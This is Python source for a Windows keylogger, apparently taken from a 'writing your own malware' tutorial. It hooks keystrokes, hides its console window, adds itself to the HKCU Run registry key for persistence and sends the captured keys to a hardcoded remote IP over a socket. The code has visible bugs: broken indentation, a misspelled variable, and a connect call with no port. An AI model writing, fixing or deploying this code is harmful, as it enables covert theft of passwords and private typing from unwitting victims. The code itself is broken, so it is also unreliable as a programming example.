# Keylogger class
# http://www.bluekaizen.org/writing-your-own-malware/
import pyHook
import pythoncom
import socket
# the next modules are used for windows functions like editing registry
# keys and hide cmd function
import win32event
import win32api
import winerror
import win32console
import win32gui
from _winreg import *
import os


def add_program_to_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = 'malware.py'
    new_file_path = fp + "\\" + file_name
    # KeyVal is a raw string variable containing registry key name.
    # python raw strings used in case we have our strings
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
        SetValueEx(key2change, "HacKeD", 0, REG_SZ, new_file_path)


data = ''
HOST_IP = "192.168.4.78"


def send_to_remote():
    global data
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST_IP))
    sock.send(data)
    sock.close()
    return True


def hide_cmd():
    import win32console
    import win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)
    return True


def get_key_pressed_and_send_id(event):
    global data
    if event.Ascii == 13:
        keys = "<ENTER>"
    elif even.Ascii == 8:
        keys = '<BACK SPACE>'
    elif event.Ascii == 9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)
    data += keys
    hide_cmd()
    send_to_remote()


add_program_to_startup()
hm = pyHook.HookManager()
hm.KeyDown = get_key_pressed_and_send_id
hm.HookKeyboard()
pythoncom.PumpMessages()
